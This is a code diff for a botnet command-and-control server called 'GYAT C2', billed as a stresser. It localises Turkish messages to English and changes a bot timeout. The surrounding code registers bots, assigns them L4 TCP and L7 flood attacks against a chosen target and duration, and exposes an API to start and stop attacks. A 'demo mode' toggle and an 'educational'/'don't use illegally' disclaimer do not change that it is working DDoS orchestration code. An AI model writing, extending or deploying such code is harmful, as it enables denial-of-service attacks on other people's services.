@@ -23,7 +23,7 @@ def load_config():
         with open('config.json', 'r') as f:
             return json.load(f)
     except FileNotFoundError:
-        print(f"{Colors.FAIL}[ERROR] config.json dosyası bulunamadı!{Colors.ENDC}")
+        print(f"{Colors.FAIL}[ERROR] Can't find config.json !{Colors.ENDC}")
         exit(1)
 
 # Log fonksiyonu
@@ -61,7 +61,7 @@ class Attack:
 
     def stop(self):
         self.is_active = False
-        log(f"Saldırı durduruldu: {self.attack_id}", "SUCCESS")
+        log(f"Attack stopped: {self.attack_id}", "SUCCESS")
 
 # Bot sınıfı
 class Bot:
@@ -83,7 +83,7 @@ class Bot:
             return False
 
     def check_alive(self):
-        if time.time() - self.last_ping > 30:  # 30 saniye ping alınmazsa bot ölü kabul edilir
+        if time.time() - self.last_ping > 60:  # 60 saniye ping alınmazsa bot ölü kabul edilir
             self.is_alive = False
         return self.is_alive
 
@@ -91,7 +91,7 @@ class Bot:
 def handle_bot(conn, addr):
     bot = Bot(conn, addr)
     connected_bots.append(bot)
-    log(f"Yeni bot bağlandı: {bot.id} ({addr[0]}:{addr[1]})", "SUCCESS")
+    log(f"New bot connected: {bot.id} ({addr[0]}:{addr[1]})", "SUCCESS")
     
     try:
         while bot.is_alive:
@@ -116,7 +116,7 @@ def handle_bot(conn, addr):
         if bot in connected_bots:
             connected_bots.remove(bot)
         conn.close()
-        log(f"Bot bağlantısı kesildi: {bot.id}", "WARNING")
+        log(f"Bot connection closed: {bot.id}", "WARNING")
 
 # Saldırı yöneticisi
 def attack_manager():
@@ -127,13 +127,13 @@ def attack_manager():
                     bot.is_busy = False
                     bot.current_attack = None
                 active_attacks.remove(attack)
-                log(f"Saldırı sona erdi: {attack.attack_id}", "INFO")
+                log(f"Attack ended: {attack.attack_id}", "INFO")
         time.sleep(1)
 
 # L4 TCP saldırısı başlat
 def start_l4_attack(target, port, duration, concurrency, demo_mode=True):
     if demo_mode:
-        log(f"DEMO MODU: L4 TCP saldırısı simüle ediliyor - Hedef: {target}:{port}, Süre: {duration}s, Bot: {concurrency}", "WARNING")
+        log(f"DEMO MODU: L4 TCP attack simulated - Target: {target}:{port}, Duration: {duration}s, Bot: {concurrency}", "WARNING")
         attack_id = f"L4_{random.randint(1000, 9999)}"
         attack = Attack(attack_id, "L4", target, port, duration, concurrency)
         active_attacks.append(attack)
@@ -161,16 +161,16 @@ def start_l4_attack(target, port, duration, concurrency, demo_mode=True):
     
     if len(attack.assigned_bots) > 0:
         active_attacks.append(attack)
-        log(f"L4 TCP saldırısı başlatıldı - Hedef: {target}:{port}, Süre: {duration}s, Bot: {len(attack.assigned_bots)}", "SUCCESS")
+        log(f"L4 TCP attack started - Target: {target}:{port}, Duration: {duration}s, Bot: {len(attack.assigned_bots)}", "SUCCESS")
         return attack_id
     else:
-        log("Saldırı başlatılamadı - Hiçbir bot komut alamadı", "ERROR")
+        log("Attack started failed - No bot received the command", "ERROR")
         return None
 
 # L7 RAW saldırısı başlat
 def start_l7_attack(target, duration, concurrency, demo_mode=True):
     if demo_mode:
-        log(f"DEMO MODU: L7 RAW saldırısı simüle ediliyor - Hedef: {target}, Süre: {duration}s, Bot: {concurrency}", "WARNING")
+        log(f"DEMO MODU: L7 RAW attack simulated - Target: {target}, Duration: {duration}s, Bot: {concurrency}", "WARNING")
         attack_id = f"L7_{random.randint(1000, 9999)}"
         attack = Attack(attack_id, "L7", target, 0, duration, concurrency)
         active_attacks.append(attack)
@@ -178,7 +178,7 @@ def start_l7_attack(target, duration, concurrency, demo_mode=True):
     
     available_bots = [bot for bot in connected_bots if not bot.is_busy and bot.is_alive]
     if len(available_bots) == 0:
-        log("Kullanılabilir bot yok!", "ERROR")
+        log("No available bot!", "ERROR")
         return None
     
     bot_count = min(concurrency, len(available_bots))
@@ -198,10 +198,10 @@ def start_l7_attack(target, duration, concurrency, demo_mode=True):
     
     if len(attack.assigned_bots) > 0:
         active_attacks.append(attack)
-        log(f"L7 RAW saldırısı başlatıldı - Hedef: {target}, Süre: {duration}s, Bot: {len(attack.assigned_bots)}", "SUCCESS")
+        log(f"L7 RAW attack started - Target: {target}, Duration: {duration}s, Bot: {len(attack.assigned_bots)}", "SUCCESS")
         return attack_id
     else:
-        log("Saldırı başlatılamadı - Hiçbir bot komut alamadı", "ERROR")
+        log("Attack started failed - No bot received the command", "ERROR")
         return None
 
 # API isteklerini işle
@@ -258,27 +258,27 @@ def handle_api_request(data):
                 port = int(request.get("port", 80))
                 attack_id = start_l4_attack(target, port, duration, concurrency, demo_mode)
                 if attack_id:
-                    return json.dumps({"status": "success", "message": "Saldırı başlatıldı", "attack_id": attack_id})
+                    return json.dumps({"status": "success", "message": "L4 attack started", "attack_id": attack_id})
                 else:
-                    return json.dumps({"status": "error", "message": "Saldırı başlatılamadı"})
+                    return json.dumps({"status": "error", "message": "L4 attack started failed"})
             
             elif attack_type == "L7":
                 attack_id = start_l7_attack(target, duration, concurrency, demo_mode)
                 if attack_id:
-                    return json.dumps({"status": "success", "message": "Saldırı başlatıldı", "attack_id": attack_id})
+                    return json.dumps({"status": "success", "message": "L7 attack started", "attack_id": attack_id})
                 else:
-                    return json.dumps({"status": "error", "message": "Saldırı başlatılamadı"})
+                    return json.dumps({"status": "error", "message": "L7 attack started failed"})
             
             else:
-                return json.dumps({"status": "error", "message": "Geçersiz saldırı türü"})
+                return json.dumps({"status": "error", "message": "Invalid attack type"})
         
         elif action == "stop_attack":
             attack_id = request.get("attack_id")
             for attack in active_attacks:
                 if attack.attack_id == attack_id:
                     attack.stop()
-                    return json.dumps({"status": "success", "message": "Saldırı durduruldu"})
-            return json.dumps({"status": "error", "message": "Saldırı bulunamadı"})
+                    return json.dumps({"status": "success", "message": "Attack stopped"})
+            return json.dumps({"status": "error", "message": "Attack not found"})
         
         elif action == "get_attacks":
             attacks_data = []
@@ -303,7 +303,7 @@ def handle_api_request(data):
             
             # Sadece root kullanıcısı için konfigürasyon güncelleme izni
             if username != config["web"]["username"]:
-                return json.dumps({"status": "error", "message": "Sadece root kullanıcısı yapılandırmayı güncelleyebilir"})
+                return json.dumps({"status": "error", "message": "Only root user can update the configuration"})
             
             # Demo modu güncelleme
             demo_mode = request.get("demo_mode")
@@ -327,13 +327,13 @@ def handle_api_request(data):
             with open('config.json', 'w') as f:
                 json.dump(config, f, indent=4)
             
-            return json.dumps({"status": "success", "message": "Yapılandırma güncellendi"})
+            return json.dumps({"status": "success", "message": "Configuration updated"})
         
         else:
-            return json.dumps({"status": "error", "message": "Geçersiz işlem"})
+            return json.dumps({"status": "error", "message": "Invalid action"})
     
     except Exception as e:
-        return json.dumps({"status": "error", "message": f"İstek işlenirken hata oluştu: {str(e)}"})
+        return json.dumps({"status": "error", "message": f"Request processing error: {str(e)}"})
 
 # Web API sunucusu
 def start_api_server():
@@ -420,13 +420,13 @@ def handle_client(client_socket, address):
 
 # Ana fonksiyon
 def main():
-    log("GYAT C2 Server başlatılıyor...", "INFO")
-    log("Pembe ve soft catgirl temalı stresser - Sadece eğitim amaçlıdır!", "WARNING")
+    log("GYAT C2 Server is starting...", "INFO")
+    log("Kitty Dev - imscruz @ GYATC2 | Dont use for unlegal activities.", "WARNING")
     
     # Yapılandırma dosyasını kontrol et
     config = load_config()
-    log(f"Yapılandırma yüklendi: {config['server']['host']}:{config['server']['port']}", "INFO")
-    log(f"Demo modu: {'Aktif' if config['settings']['demo_mode'] else 'Devre dışı'}", "INFO")
+    log(f"Configuration loaded: {config['server']['host']}:{config['server']['port']}", "INFO")
+    log(f"Demo mode: {'Active' if config['settings']['demo_mode'] else 'Disabled'}", "INFO")
     
     # Saldırı yöneticisini başlat
     attack_thread = threading.Thread(target=attack_manager)
